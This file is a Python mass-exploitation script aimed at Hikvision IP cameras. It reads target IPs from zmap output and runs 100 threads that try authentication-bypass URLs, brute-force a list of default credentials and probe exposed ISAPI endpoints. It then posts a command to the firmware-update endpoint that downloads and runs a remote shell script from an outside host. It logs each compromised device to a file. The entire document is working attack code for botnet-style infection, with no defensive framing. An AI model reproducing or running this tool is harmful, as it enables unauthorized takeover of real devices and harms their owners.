#!/usr/bin/env python3
import sys
import socket
import threading
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor
from queue import Queue

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


MAX_THREADS = 100
VULN_OUTPUT_FILE = "hello.txt"
PAYLOAD = "wget http://huyxingum.mikustore.net/c.sh | chmod 777 * | ./c.sh"


COMMON_CREDS = [
    ('admin', '12345'),
    ('admin', 'admin'),
    ('admin', '123456'),
    ('admin', '111111'),
    ('admin', '54321'),
    ('admin', 'password'),
    ('admin', ''),
    ('admin', 'admin1234'),
    ('admin', '888888'),
    ('admin', '666666'),
    ('admin', 'hikvision'),
    ('admin', 'hik12345'),
    ('admin', 'Hi123456'),
    ('admin', 'hik123456'),
    ('admin', 'ikwb'),
    ('admin', 'hik@123'),
    ('admin', 'hikvision123'),
    ('hikvision', 'hikvision'),
    ('hikvision', '')
]


VULNERABLE_ENDPOINTS = [
    "/ISAPI/Security/userCheck",
    "/System/configurationFile?auth=YWRtaW46MTEK",
    "/ISAPI/System/deviceInfo",
    "/ISAPI/Security/users",
    "/ISAPI/System/backup",
    "/ISAPI/System/update",
    "/PSIA/Custom/SelfExtract",
    "/ISAPI/ContentMgmt/Storage",
    "/ISAPI/Event/notification/httpHosts",
    "/ISAPI/PTZCtrl/channels/1/continuous",
    "/ISAPI/Streaming/channels/101",
    "/ISAPI/System/Network/interfaces",
    "/ISAPI/Security/sessionLogin/capabilities",
    "/ISAPI/System/reboot",
    "/ISAPI/System/factoryReset"
]

class ExploitFramework:
    def __init__(self):
        self.vulnerable_hosts = set()
        self.lock = threading.Lock()
        self.q = Queue()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Connection': 'keep-alive'
        })

    def check_vulnerabilities(self, ip):
        """Check all known vulnerabilities against a single IP"""
        try:
            
            if self.check_auth_bypass(ip):
                self.log_vulnerable(ip, "Authentication Bypass")
                self.deliver_payload(ip)
                return

            
            creds = self.bruteforce_credentials(ip)
            if creds:
                self.log_vulnerable(ip, f"Valid Credentials: {creds[0]}:{creds[1]}")
                self.deliver_payload(ip, auth=creds)
                return

            
            for endpoint in VULNERABLE_ENDPOINTS:
                if self.check_endpoint(ip, endpoint):
                    self.log_vulnerable(ip, f"Vulnerable Endpoint: {endpoint}")
                    self.deliver_payload(ip)
                    return

        except Exception as e:
            pass

    def check_auth_bypass(self, ip):
        """Check for auth bypass vulns"""
        urls = [
            f"http://{ip}/ISAPI/Security/userCheck",
            f"http://{ip}/System/configurationFile?auth=YWRtaW46MTEK",
            f"http://{ip}/ISAPI/Security/users?auth=YWRtaW46MTEK"
        ]

        for url in urls:
            try:
                r = self.session.get(url, timeout=5, verify=False)
                if r.status_code == 200 and any(x in r.text.lower() for x in ['<username>', 'admin', 'config']):
                    return True
            except:
                continue
        return False

    def bruteforce_credentials(self, ip):
        """Bruteforce common hik creds"""
        for username, password in COMMON_CREDS:
            try:
                auth = (username, password)
                r = self.session.get(
                    f"http://{ip}/ISAPI/System/deviceInfo",
                    auth=auth,
                    timeout=3,
                    verify=False
                )
                if r.status_code == 200 and 'deviceInfo' in r.text:
                    return (username, password)
            except:
                continue
        return None

    def check_endpoint(self, ip, endpoint):
        """Check if endpoint is accessible without auth"""
        try:
            r = self.session.get(
                f"http://{ip}{endpoint}",
                timeout=3,
                verify=False
            )
            if r.status_code == 200 and len(r.content) > 0:
                return True
        except:
            return False
        return False

    def deliver_payload(self, ip, auth=None):
        """Deliver payload to vuln device"""
        try:
            if auth:
                self.session.auth = auth

            
            payload_url = f"http://{ip}/ISAPI/System/update"
            payload_data = {
                "update": "1",
                "url": PAYLOAD
            }

            r = self.session.post(
                payload_url,
                data=payload_data,
                timeout=5,
                verify=False
            )

            if r.status_code == 200:
                with self.lock:
                    with open(VULN_OUTPUT_FILE, "a") as f:
                        f.write(f"{ip} - Payload Delivered\n")
            else:
                with self.lock:
                    with open(VULN_OUTPUT_FILE, "a") as f:
                        f.write(f"{ip} - Payload Cannot be sent\n")
        except:
            pass

    def log_vulnerable(self, ip, reason):
        """Log vulnerable hosts to file"""
        with self.lock:
            if ip not in self.vulnerable_hosts:
                self.vulnerable_hosts.add(ip)
                with open(VULN_OUTPUT_FILE, "a") as f:
                    f.write(f"{ip} - {reason}\n")
                print(f"[+] Vulnerable: {ip} - {reason}")

    def process_queue(self):
        """Process IPs from queue"""
        while True:
            ip = self.q.get()
            self.check_vulnerabilities(ip)
            self.q.task_done()

    def run(self):
        """Main execution method"""
        print("[*] Hikvision Mass")
        print("[*] (use with zmap: zmap -p80 -q -T5 | ./Hikvision.py)")

        
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            for _ in range(MAX_THREADS):
                executor.submit(self.process_queue)

            
            for line in sys.stdin:
                ip = line.strip()
                if ip and self.is_valid_ip(ip):
                    self.q.put(ip)

            self.q.join()

    @staticmethod
    def is_valid_ip(ip):
        """Validate IP adress"""
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False

if __name__ == "__main__":
    framework = ExploitFramework()
    framework.run()
